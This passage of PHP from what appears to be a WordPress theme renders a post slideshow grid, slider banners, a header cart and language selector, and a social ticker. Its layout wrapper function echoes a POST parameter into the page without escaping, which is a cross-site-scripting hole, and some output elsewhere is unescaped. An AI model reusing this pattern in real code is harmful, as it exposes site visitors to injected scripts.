					$counter_slideshow=4;
						while ($custom_query->have_posts()) : $custom_query->the_post();
							$counter_slideshow++;
							$post_no = $counter_slideshow%4;
							if($post_no == '1'){
								$width = 282;
								$height = 405;
							} else if($post_no == '2'){
								$width = 570;
								$height = 405;
							} else {
								$width = 280;
								$height = 200;
								
							}
							$blog_classes = array();
							$blog_classes[]= 'blog-grid-v2';
							$image_url = px_get_post_img_src($post->ID, $width ,$height);
							if($image_url == ""){
								$blog_classes[] = 'no-image';
							}
							$output = '';
							$output .= '<figure>';
										if($image_url <> ""){
											$output .= '<img src="'.$image_url.'">';
										}
										$output .= '<figcaption>
													<div class="text"><ul class="post-options blog-medium-options">
													';
													$before_cat = "<li>";
													$categories_list = get_the_term_list ( get_the_id(), 'category', $before_cat, ', ', '</li>' );
													if ( $categories_list ){
														$output .= $categories_list;
													}
													if ( comments_open() ) {  
														$comments_count = wp_count_comments();
														$output .= "<li class='px-comments'><a href='".get_permalink()."#respond'>".$comments_count->total_comments."</a></li>";
													}
													$output .= "</ul>";
													$title = '';
													if ( strlen(get_the_title()) > 50){$title = substr(get_the_title(),0,50);} else { $title = get_the_title();} if ( strlen(get_the_title()) > 50){ $title .= "...";}
													
													
													$output .= '<h2 class="pix-post-title"><a href="'.get_permalink().'">'.$title.'</a></h2>';
													$output .= ' <time datetime="'.date_i18n('Y-m-d',strtotime(get_the_date())).'">'.
													the_date( get_option('date_format'), '', '', false)	/*date_i18n(get_option('date_format'),strtotime(get_the_date()))*/.'</time>';
													$output .= '<div class="text-desc">'.px_return_the_excerpt('100', false).'</div>';
													
											$output .= '</div>';		
										$output .= '</figcaption>
											</figure>';		
										?>
							<article class="blog-grid-v2 <?php echo $post->ID.' post-slider-'.$post_no; ?>">
								<?php  echo $output;?>
								</article>
				<?php
					endwhile;
				endif;
			wp_reset_postdata();
			?>
	 </div>
	<?php
	}
		} 
		else if(isset($slider_type) && $slider_type <> '' && $slider_type == 'flex'){

			if(isset($slider_name) && $slider_name <> ''){
			$args=array(
			  'name' => (string)$slider_name,
			  'post_type' => 'px_gallery',
			  'post_status' => 'publish',
			  'showposts' => 1,
			);
			$get_posts = get_posts($args);
			$width = '810';
			$height = '410';
			if($get_posts){
				$slider_id = (int)$get_posts[0]->ID;
				if(isset($slider_id) && $slider_id <> ''){
				?>
				<div id="banner">
					<?php px_flex_slider($width,$height,$slider_id);?>
				</div>
				<?php	
				} else {
						echo "Please Select Slider";
				}
			}
		}
	}
	else if(isset($slider_type) && $slider_type <> '' && $slider_type == 'custom'){	
		if(isset($slider_id) && $slider_id <> ''){
			echo '<div id="banner">';
			echo do_shortcode(htmlspecialchars_decode($slider_id));	
			echo '</div>';
		} else {
				echo "Please Enter Shortcode";
		}
	}
	echo '</div>';
	}
//  <!-- Banner Section Close -->	
	
	}
}

// header shopping cart icon and languages
if ( ! function_exists( 'px_header_cart_languages' ) ) {
	function px_header_cart_languages(){
		global $px_theme_option;
		?>
		<div class="wp-sec">
			<?php 
			 if ( function_exists('icl_object_id') ) {?>
					<div class="language-sec">
						<!-- Wp Language Start -->
						 <?php
						  if(isset($px_theme_option['header_languages']) and $px_theme_option['header_languages'] == 'on'){
							  echo do_action('icl_language_selector');
						  }
						?>
					</div>
				  <?php 
				}
				 if(function_exists( 'is_woocommerce' ) && isset($px_theme_option['header_cart']) && $px_theme_option['header_cart'] == 'on'){
					px_woocommerce_header_cart();
				}
			 ?>
		 </div>
		  <?php
	}
}

// header social network, announcement
if ( ! function_exists( 'px_header_socialnetwork_announcement_section' ) ) {
	function px_header_socialnetwork_announcement_section(){
		global $px_theme_option;
		if((isset($px_theme_option['announcement_blog_category']) and $px_theme_option['announcement_blog_category'] <> "") || (isset($px_theme_option['header_social_icons']) && $px_theme_option['header_social_icons'] == 'on')){?>
		<!-- News Section Start -->
		<div class="news-section">
			<!-- Ticker Section -->
			<div class="ticker-sec">
				<?php 
					if(isset($px_theme_option['announcement_blog_category']) and $px_theme_option['announcement_blog_category'] <> ""){						px_announcement(); 
					}
				?>
				 <!-- Follow Us Section -->
				<?php
				if(isset($px_theme_option['header_social_icons']) && $px_theme_option['header_social_icons'] == 'on'){
						px_social_network();
				}
				?>
			<!-- Follow Us Section -->
			</div>
		</div>
	   <?php 
	   }	
	}
}
// Main wrapper class function
if ( ! function_exists( 'px_wrapper_class' ) ) {	
	function px_wrapper_class(){
		global $px_theme_option;
		if ( isset($_POST['layout_option']) ) {
			echo $_SESSION['mnsess_layout_option'] = $_POST['layout_option'];
		}elseif ( isset($_SESSION['mnsess_layout_option']) and !empty($_SESSION['mnsess_layout_option'])){
			echo $_SESSION['mnsess_layout_option'];
		}else {
			if ( isset($px_theme_option['layout_option']) )
			echo $px_theme_option['layout_option'];
			$_SESSION['mnsess_layout_option']='';
		}
	}
}